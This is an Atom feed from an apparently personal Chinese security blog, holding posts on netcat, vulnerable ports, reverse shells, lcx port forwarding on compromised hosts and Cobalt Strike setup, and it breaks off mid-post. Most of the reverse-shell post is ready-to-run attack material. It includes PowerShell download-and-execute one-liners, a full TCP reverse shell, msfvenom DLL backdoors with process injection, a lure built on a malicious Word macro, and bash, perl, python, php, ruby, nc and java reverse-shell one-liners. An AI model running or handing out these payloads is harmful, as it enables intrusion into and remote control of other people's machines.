<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>guolala&#39;s blog</title>
  
  <subtitle>情迷不意乱</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2018-12-04T15:12:54.197Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>guolala</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>nc命令使用</title>
    <link href="http://yoursite.com/2018/12/04/nc%E5%91%BD%E4%BB%A4%E4%BD%BF%E7%94%A8/"/>
    <id>http://yoursite.com/2018/12/04/nc命令使用/</id>
    <published>2018-12-04T15:07:24.000Z</published>
    <updated>2018-12-04T15:12:54.197Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Netcat-nc"><a href="#Netcat-nc" class="headerlink" title="Netcat(nc):"></a>Netcat(nc):</h1><p>NC（netcat）被称为网络工具中的瑞士军刀，体积小巧，但功能强大。</p><p>Nc可以在两台设备上面相互交互，即侦听模式/传输模式</p><ul><li>Telnet功能</li><li>获取banner信息</li><li>传输文本信息</li><li>传输文件/目录</li><li>加密传输文件，默认不加密</li><li>远程控制</li><li>加密所有流量</li><li>流媒体服务器</li><li>远程克隆硬盘</li></ul><h2 id="常用参数："><a href="#常用参数：" class="headerlink" title="常用参数："></a>常用参数：</h2><ul><li>-n 以数字形式表示的IP地址</li><li>-v 显示详细信息 [使用=vv获取更详细的信息</li><li>-l 监听入站信息</li><li>-p port 本地端口</li><li>-q secs 在标准输入且延迟后退出</li><li>-c shell commands shell模式</li><li>-u UDP模式</li><li>-s addr 本地源地址</li><li>-h 获取帮助信息</li><li>-z I/O 模式 [扫描时使用]</li></ul><h2 id="实例："><a href="#实例：" class="headerlink" title="实例："></a>实例：</h2><h3 id="正向连接"><a href="#正向连接" class="headerlink" title="正向连接"></a>正向连接</h3><pre><code>A:nc -lp port -c bashB:nc ip port</code></pre><p>A将自己的Bash发给B</p><h3 id="反向连接"><a href="#反向连接" class="headerlink" title="反向连接"></a>反向连接</h3><pre><code>A:nc -lp portB:nc ip port -c bash</code></pre><p>B将自己的Bash发给A</p><blockquote><p>win下Bash换成cmd</p></blockquote><p>通常反向连接 比较常用，因为防火墙的存在，让目标机主动发送shell</p><h2 id="使用NC进行信息收集"><a href="#使用NC进行信息收集" class="headerlink" title="使用NC进行信息收集"></a>使用NC进行信息收集</h2><h3 id="简单的建立连接，就是侦听模式和传输模式"><a href="#简单的建立连接，就是侦听模式和传输模式" class="headerlink" title="简单的建立连接，就是侦听模式和传输模式"></a>简单的建立连接，就是侦听模式和传输模式</h3><ul><li>nc -lp port  监听指定端口号</li><li>nc -nv ip port  连接对方tcp端口，默认情况下，双方可以发送文本信息</li></ul><h3 id="收集目标机上的进程信息"><a href="#收集目标机上的进程信息" class="headerlink" title="收集目标机上的进程信息"></a>收集目标机上的进程信息</h3><ul><li>nc -l -p 4444 &gt;wing.txt 将远程发送过来的内容保存在本地</li><li>Ps aux |nc -nv ip port -q 1  标准输入完成后delay一秒钟，会发送到侦听端</li></ul><h2 id="NC传输文件-目录"><a href="#NC传输文件-目录" class="headerlink" title="NC传输文件/目录"></a>NC传输文件/目录</h2><ul><li>nc -lp 4444 &gt;1.txt 1.txt就是你要保存的文件名 自定义</li><li>nc -nv ip port &lt;1.txt -q 1 将文件发送给侦听端<blockquote><p>侦听端的文件名最好按照文件本身来命名</p></blockquote></li></ul><p><strong>将目录打包：</strong></p><p>tar -cvf - 目录名/|nc -lp port -q 1</p><p><strong>将目录解包</strong></p><p>nc -nv ip port |tar -xvf -</p><p><strong>NC端口扫描</strong></p><p>nc -nvz ip 1-65535</p><h2 id="NC文件加密传输"><a href="#NC文件加密传输" class="headerlink" title="NC文件加密传输"></a>NC文件加密传输</h2><pre><code>apt-get install mcryptA： nc -lp port|mcrypt - -flush -Fbqd -a rijndael-256 -m ecb &gt;文件名B：mcrypt --flush -Fbq -a rijndael-256 -m ecb &lt;文件名|nc -nv ip port -q 1</code></pre><p>B将文件加密发送，A接受后先解密再保存到本地，B在1s后退出。<br>主要是利用mcrypt进行加密</p><h2 id="NC端口扫描"><a href="#NC端口扫描" class="headerlink" title="NC端口扫描"></a>NC端口扫描</h2><p>nc -nvz ip 1-65535</p><p><img src="http://ww1.sinaimg.cn/large/007pEd8Wly1fxv4a6vt6pj30kn0hc406.jpg" alt=""></p><p>默认使用tcp进行扫描</p><h2 id="NC复制磁盘"><a href="#NC复制磁盘" class="headerlink" title="NC复制磁盘"></a>NC复制磁盘</h2><pre><code>A:nc -lp port |dd of=/dev/sdaB: dd if=/dev/sda | nc -nc ip port -q 1</code></pre><ul><li>If是input filter</li><li>Of 是output filter</li></ul><p>B将数据复制到A挂载的硬盘上</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Netcat-nc&quot;&gt;&lt;a href=&quot;#Netcat-nc&quot; class=&quot;headerlink&quot; title=&quot;Netcat(nc):&quot;&gt;&lt;/a&gt;Netcat(nc):&lt;/h1&gt;&lt;p&gt;NC（netcat）被称为网络工具中的瑞士军刀，体积小巧，但功能强大。&lt;/p
      
    
    </summary>
    
      <category term="命令使用" scheme="http://yoursite.com/categories/%E5%91%BD%E4%BB%A4%E4%BD%BF%E7%94%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>常见的漏洞端口</title>
    <link href="http://yoursite.com/2018/12/04/%E5%B8%B8%E8%A7%81%E7%9A%84%E6%BC%8F%E6%B4%9E%E7%AB%AF%E5%8F%A3/"/>
    <id>http://yoursite.com/2018/12/04/常见的漏洞端口/</id>
    <published>2018-12-04T07:48:29.000Z</published>
    <updated>2018-12-04T07:56:29.494Z</updated>
    
    <content type="html"><![CDATA[<p><strong>21</strong> ftp 主要看是否支持匿名，也可以跑弱口令</p><p><strong>22</strong> ssh SSH远程登录协议</p><p><strong>23</strong> telnet telnet终端仿真协议</p><p><strong>80</strong> web 常见web漏洞以及是否为一些管理后台</p><p><strong>389</strong> LDAP（轻量目录访问协议）存在匿名访问</p><p><strong>443</strong> openssl 心脏滴血以及一些web漏洞测试</p><p><strong>873</strong> rsync 主要看是否支持匿名，也可以跑弱口令</p><p><strong>1099</strong>  JAVArmi  命令执行</p><p><strong>1433</strong> SQl server</p><p><strong>1521</strong>  Oracle   弱口令</p><p><strong>3306</strong> MySQL 能够外联数据库</p><p><strong>3389</strong> RDP 远程桌面看看能不能弱口令</p><p><strong>5432</strong>        PostGreSQL       弱口令爆破</p><p><strong>6379</strong> redis 一般无认证，可直接访问</p><p><strong>7001，7002</strong>  weblogic的console口</p><p><strong>8080</strong>  Tomcat\Jboss     弱口令，Jboss匿名访问</p><p><strong>8080-8090</strong>   常见Web端口</p><p><strong>9000</strong> fast-cgi对外可以getshell</p><p><strong>9043</strong>        WebSphere        弱口令爆破</p><p><strong>27017</strong>    MongoDB          未授权访问</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;strong&gt;21&lt;/strong&gt; ftp 主要看是否支持匿名，也可以跑弱口令&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;22&lt;/strong&gt; ssh SSH远程登录协议&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;23&lt;/strong&gt; telnet telnet终端仿真协议&lt;/p&gt;
&lt;p&gt;
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>反弹shell的几种姿势</title>
    <link href="http://yoursite.com/2018/12/04/%E5%8F%8D%E5%BC%B9shell%E7%9A%84%E5%87%A0%E7%A7%8D%E5%A7%BF%E5%8A%BF/"/>
    <id>http://yoursite.com/2018/12/04/反弹shell的几种姿势/</id>
    <published>2018-12-04T03:01:26.000Z</published>
    <updated>2018-12-04T15:07:40.156Z</updated>
    
    <content type="html"><![CDATA[<h1 id="powershell反弹shell"><a href="#powershell反弹shell" class="headerlink" title="powershell反弹shell"></a>powershell反弹shell</h1><h2 id="powercat反弹shell"><a href="#powercat反弹shell" class="headerlink" title="powercat反弹shell"></a>powercat反弹shell</h2><p>环境说明：</p><ul><li>攻击机1：KALI 192.168.209.159</li><li>攻击机2：ubuntu 192.168.209.155</li><li>目标机：win7 192.168.209.160</li></ul><p><strong>可以在GitHub上下载powercat：</strong></p><p><a href="https://github.com/besimorhino/powercat" target="_blank" rel="noopener">https://github.com/besimorhino/powercat</a></p><p>powercat为Powershell版的Netcat，实际上是一个powershell的函数，使用方法类似Netcat。</p><p>攻击机开启监听：</p><pre><code>nc -lvp 666</code></pre><p>或者用powercat监听：</p><pre><code>powercat -l -p 666</code></pre><p>目标机执行反弹cmd shell：</p><pre><code>powershell IEX (New-Object System.Net.Webclient).DownloadString(&apos;https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1&apos;);powercat -c 192.168.209.159 -p 6666 -e cmd</code></pre><p><img src="http://ww1.sinaimg.cn/large/007pEd8Wly1fxujq7s2rzj30hv01rq2r.jpg" alt=""></p><p><img src="http://ww1.sinaimg.cn/large/007pEd8Wly1fxujqds59gj30hf06dq68.jpg" alt=""></p><h2 id="nishang反弹shell"><a href="#nishang反弹shell" class="headerlink" title="nishang反弹shell"></a>nishang反弹shell</h2><p>Nishang(<a href="https://github.com/samratashok/nishang" target="_blank" rel="noopener">https://github.com/samratashok/nishang </a>)是一个基于PowerShell的攻击框架，集合了一些PowerShell攻击脚本和有效载荷，可反弹TCP/ UDP/ HTTP/HTTPS/ ICMP等类型shell。</p><h2 id="Reverse-TCP-shell"><a href="#Reverse-TCP-shell" class="headerlink" title="Reverse TCP shell"></a>Reverse TCP shell</h2><p>攻击机1（192.168.209.159）开启监听：</p><pre><code>nc -lvp 666</code></pre><p>目标机执行：</p><pre><code>powershell IEX (New-Object Net.WebClient).DownloadString(&apos;https://raw.githubusercontent.com/samratashok/nishang/9a3c747bcf535ef82dc4c5c66aac36db47c2afde/Shells/Invoke-PowerShellTcp.ps1&apos;);Invoke-PowerShellTcp -Reverse -IPAddress 192.168.209.159 -port 6666</code></pre><p>或者将nishang下载到攻击者本地：</p><pre><code>powershell IEX (New-Object Net.WebClient).DownloadString(&apos;http://192.168.159.134/nishang/Shells/Invoke-PowerShellTcp.ps1&apos;);Invoke-PowerShellTcp -Reverse -IPAddress 192.168.209.159 -port 6666</code></pre><p><img src="http://ww1.sinaimg.cn/large/007pEd8Wly1fxuklpyrglj30i308zdig.jpg" alt=""></p><h2 id="Reverse-UDP-shell"><a href="#Reverse-UDP-shell" class="headerlink" title="Reverse UDP shell"></a>Reverse UDP shell</h2><p>攻击机1（192.168.209.159）开启监听：</p><pre><code>nc -lvup 123</code></pre><p>目标机执行：</p><pre><code>powershell IEX (New-Object Net.WebClient).DownloadString(&apos;http://10.60.17.46/123.ps1&apos;);Invoke-PowerShellUdp -Reverse -IPAddress 192.168.209.159 -port 123</code></pre><blockquote><p>123.ps1为Invoke-PowerShellUdp.ps1，搭建了个网站IP为10.60.17.46</p></blockquote><p><img src="http://ww1.sinaimg.cn/large/007pEd8Wly1fxuq2fok35j30ht060tam.jpg" alt=""></p><h2 id="Reverse-ICMP-shell"><a href="#Reverse-ICMP-shell" class="headerlink" title="Reverse ICMP shell"></a>Reverse ICMP shell</h2><p>需要利用icmpsh_m.py (<a href="https://github.com/inquisb/icmpsh" target="_blank" rel="noopener">https://github.com/inquisb/icmpsh</a>)和nishang中的Invoke-PowerShellIcmp.ps1 来反弹ICMP shell。</p><p>攻击机1下载icmpsh_m.py文件，并执行</p><p><code>python icmpsh_m.py [Attacker IP] [Victim IP]</code></p><pre><code>sysctl -w net.ipv4.icmp_echo_ignore_all=1 #忽略所有icmp包python icmpsh_m.py 192.168.209.159 192.168.209.160 #开启监听</code></pre><p>目标机执行：</p><pre><code>powershell iex(New-Object Net.WebClient).DownloadString(&apos;http://10.60.17.46/Invoke-PowerShellIcmp.ps1&apos;);Invoke-PowerShellIcmp -IPAddress 192.168.209.159</code></pre><p><img src="http://ww1.sinaimg.cn/large/007pEd8Wly1fxuuo12w1cj30jm09y75t.jpg" alt=""></p><h2 id="自定义powershell函数反弹shell"><a href="#自定义powershell函数反弹shell" class="headerlink" title="自定义powershell函数反弹shell"></a>自定义powershell函数反弹shell</h2><p>利用<strong>powershell</strong>创建一个<strong>Net.Sockets.TCPClient</strong>对象，通过<strong>Socket</strong>反弹<strong>tcp shell</strong>，其实也是借鉴<strong>nishang</strong>中的<strong>Invoke-PowerShellTcpOneLine.ps1</strong></p><p>攻击机1（192.168.209.159）开启监听：</p><pre><code>nc -lvp 2333</code></pre><p>目标机执行：</p><pre><code>powershell -nop -c &quot;$client = New-Object Net.Sockets.TCPClient(&apos;192.168.209.159&apos;,2333);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback + &apos;PS &apos; + (pwd).Path + &apos;&gt; &apos;;$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()&quot;</code></pre><p><img src="http://ww1.sinaimg.cn/large/007pEd8Wly1fxuvui1lipj30ib03taas.jpg" alt=""></p><p>或者保存为lltest_tcp.ps1文件</p><pre><code>powershell IEX (New-Object Net.WebClient).DownloadString(&apos;http://10.60.17.46/lltest_tcp.ps1&apos;);Invoke-lltestTcp</code></pre><p>lltest_tcp.ps1 如下：</p><pre><code>function Invoke-lltestTcp{$client = New-Object Net.Sockets.TCPClient(&apos;192.168.159.134&apos;,6666)$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0}while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i)$sendback = (iex $data 2&gt;&amp;1 | Out-String )$sendback2 = $sendback + &apos;PS &apos; + (pwd).Path + &apos;&gt; &apos;$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)$stream.Write($sendbyte,0,$sendbyte.Length)$stream.Flush()}$client.Close()}</code></pre><h2 id="dnscat2-反弹DNS-shell"><a href="#dnscat2-反弹DNS-shell" class="headerlink" title="dnscat2 反弹DNS shell"></a>dnscat2 反弹DNS shell</h2><p>dnscat2(<a href="https://github.com/iagox86/dnscat2" target="_blank" rel="noopener">https://github.com/iagox86/dnscat2</a>)是一个DNS隧道，旨在通过DNS协议创建加密的命令和控制（C＆C）通道。dnscat2分为两部分：客户端和服务器。dnscat2客户端采用C语言编写，服务器端采用ruby语言编写。后来又有安全研究人员使用PowerShell脚本重写了dnscat2客户端dnscat2-powershell(<a href="https://github.com/lukebaggett/dnscat2-powershell" target="_blank" rel="noopener">https://github.com/lukebaggett/dnscat2-powershell</a>)</p><p>利用dnscat2 和 dnscat2-powershell实现反弹DNS shell:</p><p>攻击者2(Ubuntu 192.168.209.155)开启监听：</p><pre><code>ruby dnscat2.rb --dns &quot;domain=lltest.com,host=192.168.209.155&quot; --no-cache -e open</code></pre><blockquote><p>-e open 不使用加密连接，默认使用加密</p></blockquote><ul><li>ruby dnscat2.rb —help 查看帮助</li></ul><p>目标机执行：</p><pre><code>powershell IEX (New-Object System.Net.Webclient).DownloadString(&apos;https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/master/dnscat2.ps1&apos;);Start-Dnscat2 -Domain lltest.com -DNSServer 192.168.209.155</code></pre><p>成功反弹shell后，攻击机2：</p><pre><code>session -i 1 #进入到session 1shell #执行之后会新生成一个session 需要通过session -i 2 切换session -i 2</code></pre><p><img src="http://ww1.sinaimg.cn/large/007pEd8Wly1fxuyo6e3lkj30gr0d9js3.jpg" alt=""></p><p><img src="http://ww1.sinaimg.cn/large/007pEd8Wly1fxuyp53vbcj30cc077mx8.jpg" alt=""></p><h2 id="Empire-结合office反弹shell"><a href="#Empire-结合office反弹shell" class="headerlink" title="Empire 结合office反弹shell"></a>Empire 结合office反弹shell</h2><p>Empire(<a href="https://github.com/EmpireProject/Empire" target="_blank" rel="noopener">https://github.com/EmpireProject/Empire</a>) 基于powershell的后渗透攻击框架，可利用office 宏、OLE对象插入批处理文件、HTML应用程序(HTAs)等进行反弹shell</p><h3 id="利用office-宏反弹shell"><a href="#利用office-宏反弹shell" class="headerlink" title="利用office 宏反弹shell"></a>利用office 宏反弹shell</h3><p>攻击者(192.168.209.159)开启监听:</p><pre><code>uselistener httpexecutebackusestager windows/macro http #生成payloadexecute</code></pre><p>生成/tmp/macro 攻击代码后，新建一个word 创建宏</p><p>点击<strong>“文件”-“宏”-“创建”</strong>，删除自带的脚本，复制进去<strong>/tmp/macro</strong>文件内容，并保存为<strong>“Word 97-2003文档(.doc)”</strong>或者<strong>“启用宏的Word 文档(.docm)”</strong>文档，当诱导目标打开，执行宏后，即可成功反弹shell：</p><blockquote><p>说明:需要开启宏或者用户手动启用宏。开启宏设置：<strong>“文件”-“选项”-“信任中心”</strong>,选择“启用所有宏”</p></blockquote><p><img src="http://ww1.sinaimg.cn/large/007pEd8Wly1fxuzjkmh4jj30nr0g6ac1.jpg" alt=""></p><p><img src="http://ww1.sinaimg.cn/large/007pEd8Wly1fxuzk0ox8cj30ol0dtwf0.jpg" alt=""></p><h2 id="PowerSploit-DLL注入反弹shell"><a href="#PowerSploit-DLL注入反弹shell" class="headerlink" title="PowerSploit DLL注入反弹shell"></a>PowerSploit DLL注入反弹shell</h2><p>PowerSploit是又一款基于powershell的后渗透攻击框架。PowerSploit包括Inject-Dll(注入dll到指定进程)、Inject-Shellcode（注入shellcode到执行进程）等功能。<br>利用msfvenom、metasploit和PowerSploit中的Invoke-DllInjection.ps1 实现dll注入，反弹shell</p><h3 id="msfvenom生成dll后门"><a href="#msfvenom生成dll后门" class="headerlink" title="msfvenom生成dll后门"></a>msfvenom生成dll后门</h3><p>目标机1执行：</p><pre><code>msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.209.159 lport=4449 -f dll -o /var/www/html/test.dll</code></pre><blockquote><p>目标机64位 用x64 ； 32位的话用windows/meterpreter/reverse_tcp</p></blockquote><p><img src="http://ww1.sinaimg.cn/large/007pEd8Wly1fxuzuqx202j30hc063n0j.jpg" alt=""></p><h3 id="metasploit-设置payload-开启监听"><a href="#metasploit-设置payload-开启监听" class="headerlink" title="metasploit 设置payload 开启监听"></a>metasploit 设置payload 开启监听</h3><p>攻击机1执行：</p><pre><code>use exploit/multi/handlerset PAYLOAD windows/x64/meterpreter/reverse_tcpset LHOST 192.168.209.159set LPORT 4449exploit</code></pre><p><img src="http://ww1.sinaimg.cn/large/007pEd8Wly1fxuzyze3zgj30j80cvjyo.jpg" alt=""></p><h3 id="目标机远程下载"><a href="#目标机远程下载" class="headerlink" title="目标机远程下载"></a>目标机远程下载</h3><p>powershell 下载PowerSploit中Invoke-DllInjection.ps1和msfvenom生成的dll后门<br>首先上传dll文件到目标机。然后Get-Process 选定一个进程，最后注入到该进程</p><p>目标执行：</p><pre><code>Get-Process #查看进程进程</code></pre><p><img src="http://ww1.sinaimg.cn/large/007pEd8Wly1fxv3gxyplaj30i00bkdgb.jpg" alt=""></p><pre><code>IEX (New-Object Net.WebClient).DownloadString(&apos;http://192.168.209.159/Invoke-DllInjection.ps1&apos;); Invoke-DllInjection -ProcessID 5448 -Dll C:\Users\郭翔\Desktop\test.dll</code></pre><p><img src="http://ww1.sinaimg.cn/large/007pEd8Wly1fxv3gbw7nzj30ec05iglm.jpg" alt=""></p><h2 id="metasploit反弹shell"><a href="#metasploit反弹shell" class="headerlink" title="metasploit反弹shell"></a>metasploit反弹shell</h2><p>利用metasploit的web_delivery模块可通过python、php、powershell、regsvr32等进行反弹shell</p><p>攻击者1(192.168.209.159)：</p><pre><code>msfconsoleuse exploit/multi/script/web_deliveryset PAYLOAD windows/meterpreter/reverse_tcpset target 2set LHOST 192.168.209.159set LPORT 123exploit</code></pre><p>执行完exploit后会弹出一段payload，将这段payload复制到目标机</p><p><img src="http://ww1.sinaimg.cn/large/007pEd8Wly1fxuzee76ukj30k505kn0l.jpg" alt=""></p><p>目标机执行：</p><pre><code>powershell.exe -nop -w hidden -c $f=new-object net.webclient;$f.proxy=[Net.WebRequest]::GetSystemWebProxy();$f.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $f.downloadstring(&apos;http://192.168.209.159:8080/1nLv5Znszan1&apos;);</code></pre><p><img src="http://ww1.sinaimg.cn/large/007pEd8Wly1fxuzcyrpgnj30yd09547q.jpg" alt=""></p><h2 id="Cobalt-strike反弹shell"><a href="#Cobalt-strike反弹shell" class="headerlink" title="Cobalt strike反弹shell"></a>Cobalt strike反弹shell</h2><p>博客中有一个专门的文章对Cobalt strike做介绍。</p><h1 id="bash版本："><a href="#bash版本：" class="headerlink" title="bash版本："></a>bash版本：</h1><pre><code>bash -i &gt;&amp; /dev/tcp/10.0.0.1/8080 0&gt;&amp;1</code></pre><blockquote><p>注意某些linux不支持</p></blockquote><p>这里shell由bash解析，有时候是由sh解析，不一定百发百中</p><p>这里<code>&amp;</code>在Linux shell中表示后台运行，当然这里<code>0&gt;&amp;1</code>不是这样,对于<code>&amp;1</code>更准确的说应该是文件描述符1,而1一般代表的就是STDOUT_FILENO</p><h1 id="perl版本"><a href="#perl版本" class="headerlink" title="perl版本:"></a>perl版本:</h1><pre><code>perl -e &apos;use Socket;$i=&quot;10.0.0.1&quot;;$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);};&apos;</code></pre><h1 id="python版本："><a href="#python版本：" class="headerlink" title="python版本："></a>python版本：</h1><pre><code>python -c &apos;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.0.0.1&quot;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&apos;</code></pre><h1 id="php版本："><a href="#php版本：" class="headerlink" title="php版本："></a>php版本：</h1><pre><code>php -r &apos;$sock=fsockopen(&quot;10.0.0.1&quot;,1234);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&apos;</code></pre><h1 id="ruby版本："><a href="#ruby版本：" class="headerlink" title="ruby版本："></a>ruby版本：</h1><pre><code>ruby -rsocket -e&apos;f=TCPSocket.open(&quot;10.0.0.1&quot;,1234).to_i;exec sprintf(&quot;/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&quot;,f,f,f)&apos;</code></pre><h1 id="nc版本："><a href="#nc版本：" class="headerlink" title="nc版本："></a>nc版本：</h1><pre><code>nc -e /bin/sh 10.0.0.1 1234rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1nc 10.0.0.1 1234 &gt;/tmp/fnc x.x.x.x 8888|/bin/sh|nc x.x.x.x 9999</code></pre><h1 id="java版本"><a href="#java版本" class="headerlink" title="java版本"></a>java版本</h1><pre><code>r = Runtime.getRuntime()p = r.exec([&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;exec 5&lt;&gt;/dev/tcp/10.0.0.1/2002;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done&quot;] as String[])p.waitFor()</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;powershell反弹shell&quot;&gt;&lt;a href=&quot;#powershell反弹shell&quot; class=&quot;headerlink&quot; title=&quot;powershell反弹shell&quot;&gt;&lt;/a&gt;powershell反弹shell&lt;/h1&gt;&lt;h2 id=&quot;power
      
    
    </summary>
    
      <category term="shell" scheme="http://yoursite.com/categories/shell/"/>
    
    
  </entry>
  
  <entry>
    <title>lcx使用:端口转发</title>
    <link href="http://yoursite.com/2018/12/03/lcx%E4%BD%BF%E7%94%A8-%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/"/>
    <id>http://yoursite.com/2018/12/03/lcx使用-端口转发/</id>
    <published>2018-12-03T13:59:05.000Z</published>
    <updated>2018-12-03T14:44:48.933Z</updated>
    
    <content type="html"><![CDATA[<p>端口映射在入侵内网的时候经常用到，特别是要登陆远程终端服务时，使用端口映射就非常方便。</p><p>Lcx.exe是一个端口转发工具，相当于把肉鸡A上的3389端口转发到具有外网IP地址的B机上,这样连接B机的3389就相当于连接A机的3389端口。Lcx程序多用于被控制计算机(肉鸡)处于内网的情况，被控制机可能中了木马程序，虽然能够进行控制，但还是没有使用远程终端登陆到本机进行管理方便，因此在很多情况下，都会想方设法在被控制计算机上开启3389端口，然后通过lcx等程序进行端口转发，进而在本地连接到被控制计算机的远程终端并进行管理和使用。</p><h1 id="三个功能"><a href="#三个功能" class="headerlink" title="三个功能"></a>三个功能</h1><h2 id="tran功能"><a href="#tran功能" class="headerlink" title="tran功能"></a>tran功能</h2><p>ran功能是端口转向功能，通过访问该端口可以直接与该主机或另一台的某一个端口进行通信。</p><p>例如：</p><h3 id="本机端口转向："><a href="#本机端口转向：" class="headerlink" title="本机端口转向："></a>本机端口转向：</h3><pre><code>lcx -tran 55 127.0.0.1 3389</code></pre><p><img src="http://ww1.sinaimg.cn/large/007pEd8Wly1fxtx91elgyj30vw0enab4.jpg" alt=""></p><h3 id="转向其他主机端口："><a href="#转向其他主机端口：" class="headerlink" title="转向其他主机端口："></a>转向其他主机端口：</h3>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;端口映射在入侵内网的时候经常用到，特别是要登陆远程终端服务时，使用端口映射就非常方便。&lt;/p&gt;
&lt;p&gt;Lcx.exe是一个端口转发工具，相当于把肉鸡A上的3389端口转发到具有外网IP地址的B机上,这样连接B机的3389就相当于连接A机的3389端口。Lcx程序多用于被控制
      
    
    </summary>
    
      <category term="内网渗透工具" scheme="http://yoursite.com/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7/"/>
    
    
  </entry>
  
  <entry>
    <title>Cobalt Strike的使用</title>
    <link href="http://yoursite.com/2018/12/03/Cobalt-Strike%E7%9A%84%E4%BD%BF%E7%94%A8/"/>
    <id>http://yoursite.com/2018/12/03/Cobalt-Strike的使用/</id>
    <published>2018-12-03T09:56:34.000Z</published>
    <updated>2018-12-03T11:46:51.611Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Cobalt-Strike简介："><a href="#Cobalt-Strike简介：" class="headerlink" title="Cobalt Strike简介："></a>Cobalt Strike简介：</h1><ul><li><strong>Cobalt Strike是一款渗透测试软件，分为客户端与服务端，服务端是一个，客户端可以有多个，可以进行团队分布式操作</strong></li><li><strong>Cobalt Strike集成了端口转发、扫描多模式端口Listener、Windows exe程序生成、Windows dll动态链接库生成、java程序生成、office宏代码生成，包括站点克隆获取浏览器的相关信息等。</strong></li></ul><h1 id="Cobalt-Strike的安装"><a href="#Cobalt-Strike的安装" class="headerlink" title="Cobalt Strike的安装"></a>Cobalt Strike的安装</h1><p>Ubuntu 默认只有openjdk的源，但是cobalt strike建议使用oracle jdk需要需要先加入源。</p><pre><code>apt-get install software-properties-common python-software-propertieadd-apt-repository ppa:webupd8team/javaapt-get updateapt-get install oracle-Java8-installer</code></pre><p>下载好Cobalt Strike工具然后解压缩。</p><p>进入Cobalt Strike文件内部开启服务</p><pre><code>sudo ./teamserver 10.60.17.46 123456</code></pre><p><img src="http://ww1.sinaimg.cn/large/007pEd8Wly1fxtpo5e81zj30kb051759.jpg" alt=""></p><p><strong>后面这两个数是服务器IP（ubuntu的IP）和密码</strong></p><h3 id="配置客户端"><a href="#配置客户端" class="headerlink" title="配置客户端"></a>配置客户端</h3><p>客户端需要安装java环境，平台并无特殊要求。</p><p>启动：</p><ul><li>Ubuntu:<code>java-jar cobalt strike</code></li><li>windows直接双击启动</li></ul><p><img src="http://ww1.sinaimg.cn/large/007pEd8Wly1fxtrjw1900j30gb0ds0uu.jpg" alt=""></p><ul><li>host：服务器主机</li><li>port：50050</li><li>user：自定</li><li>password：服务器设置的</li></ul><h3 id="进入后首先配置监听器："><a href="#进入后首先配置监听器：" class="headerlink" title="进入后首先配置监听器："></a>进入后首先配置监听器：</h3><p>点击上方Cobalt Strike选项——&gt;在下拉框中选择listeners——&gt;在下方弹出区域中单机add</p><p><img src="http://ww1.sinaimg.cn/large/007pEd8Wly1fxtrlbdo9jj30ho0gi75u.jpg" alt=""></p><ul><li>name：为监听器名字。</li><li>选择payload类型</li><li>host为shell反弹接受主机（服务端IP）</li><li>port为反弹端口</li></ul><p><img src="http://ww1.sinaimg.cn/large/007pEd8Wly1fxtrpdchktj309506ddg2.jpg" alt=""></p><p>其实,监听器的作用很简单,主要是为了接受payload回传的各类数据</p><p>比如,我们的payload在目标机器执行以后,会回连到监听器然后下载执行真正的shellcode代码,其实跟msf中handler的作用基本是一致的</p><ul><li>beacon  为cs内置监听器,也就是说,当我们在目标系统成功执行payload以后,会弹回一个beacon的shell给cs 该shell所支持的通信协议主要包括这几种,dns,https,http,smb[pipe],另外,beacon shell的内置功能也非常多</li></ul><ul><li>foreign 主要是提供给外部使用的一些监听器,比如你想利用cs派生一个meterpreter的shell回来,来继续后面的内网渗透,这时就选择使用外部监听器</li></ul><h3 id="生成payload："><a href="#生成payload：" class="headerlink" title="生成payload："></a>生成payload：</h3><p>点击attacks——&gt;packages——&gt;windows executable</p><p><img 